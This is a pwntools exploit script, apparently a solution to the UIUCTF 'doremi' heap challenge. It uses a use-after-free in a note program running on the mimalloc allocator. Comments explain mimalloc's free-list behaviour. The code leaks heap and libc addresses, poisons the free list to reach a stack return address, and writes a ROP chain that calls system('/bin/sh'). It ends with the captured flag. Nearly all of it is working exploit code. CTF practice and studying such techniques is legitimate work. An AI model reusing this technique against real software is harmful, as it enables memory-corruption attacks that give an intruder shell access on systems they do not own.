from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', env={'LD_PRELOAD': './libmimalloc.so.2.2'}, gdbscript='''
    b *(main+292)
    b *(main+304)
    b *(main+316)
    b *(main+328)
    continue
''')

# p = remote('doremi.chal.uiuc.tf', 1337, ssl=True)

def create(position):
    # malloc a chunk of size 128 at position with storing chunk pointer in global variable notes[position]
    p.sendlineafter(b"YAHNC> ", b'1')
    p.sendlineafter(b"Position? (0-15): ", str(position).encode())

def delete(position):
    # free a chunk at position without setting chunk pointer in global variable notes[position] to NULL (use-after-free)
    p.sendlineafter(b"YAHNC> ", b'2')
    p.sendlineafter(b"Position? (0-15): ", str(position).encode())

def look(position):
    # read data from a chunk at position for 127 bytes
    p.sendlineafter(b"YAHNC> ", b'3')
    p.sendlineafter(b"Position? (0-15): ", str(position).encode())
    return p.recv(127)

def update(position, content):
    # write data to a chunk at position for 127 bytes max (no heap buffer overflow)
    p.sendlineafter(b"YAHNC> ", b'4')
    p.sendlineafter(b"Position? (0-15): ", str(position).encode())
    p.sendafter(b"Content? (127 max): ", content)


# mimalloc allocator is dynamically linked to override default musl allocator, which applies different layout of heap area and regulations of heap bins, leading to a different heap exploitation strategy
# 1. once the first chunk of size 0x80 is malloced, mimalloc generates a malloc linked list of 0x20 chunks of size 0x80 with addresses from heap_base_addr+0x10080 to heap_base_addr+0x11000 by storing the next malloced chunk pointer in the first qword of each malloced chunk, which is the sequential order of where the following chunks will be malloced in the future
# 2. after all the 0x20 chunks of size 0x80 in this prepared malloc linked list are malloced and no any chunk is freed, once another chunk of size 0x80 is malloced, the above process will be repeated again, and another malloc linked list of 0x20 chunks of size 0x80 with addresses from heap_base_addr+0x11080 to heap_base_addr+0x12000 will be generated, and so on
# 3. once any chunk of size 0x80 is freed, mimalloc updates the free linked list of 0x20 chunks of size 0x80 by storing the last freed chunk pointer in the first qword of each freed chunk, which is the sequential order of where the following chunks will be malloced in the future, very similar to tcache bins in normal glibc allocator, making it possible to perform tcache-posioning-like attack
# 4. malloc linked list has a higher priority than free linked list, so if malloc linked list is not empty, free linked list will be ignored, meaning that malloc linked list has to be empty before performing tcache-posioning-like attack on free linked list

glibc_e = ELF('./ld-musl-x86_64.so.1')

# Stage 1: leak heap base address and glibc base address
# clear malloc linked list and build free linked list
for _ in range(0x1f):
    create(0)
    delete(0)
create(1)
# leak heap base address
heap_base_addr = u64(look(0)[0:8])-0x10f00
log.info(f"heap base address: {hex(heap_base_addr)}")
# perform tcache-posioning-like attack
update(0, p64(heap_base_addr)+b'a'*119)
create(2)
create(3)
# leak glibc base address
glibc_base_addr = u64(look(3)[0x28:0x30])+0x42c0
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: leak return address of update function
# clear malloc linked list and build free linked list
for _ in range(0x1f):
    create(4)
    delete(4)
create(5)
# perform tcache-posioning-like attack
update(4, p64(glibc_base_addr+glibc_e.sym.environ-8)+b'a'*119)
create(6)
create(7)
# leak return address of update function
update_return_addr = u64(look(7)[8:0x10])-0x70
log.info(f"update return address: {hex(update_return_addr)}")

# Stage 3: ROP to trigger system('/bin/sh\x00')
# clear malloc linked list and build free linked list
for _ in range(0x1f):
    create(8)
    delete(8)
create(9)
# perform tcache-posioning-like attack
update(8, p64(update_return_addr)+b'a'*119)
create(10)
create(11)
# ROP chain to trigger system('/bin/sh\x00')
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
# write ROP chain to return address of update function
update(11, b''.join([p64(c) for c in chain]))

p.interactive()

# uiuctf{does_anyone_still_like_doing_these_?_have_we_not_conquered_every_land_?}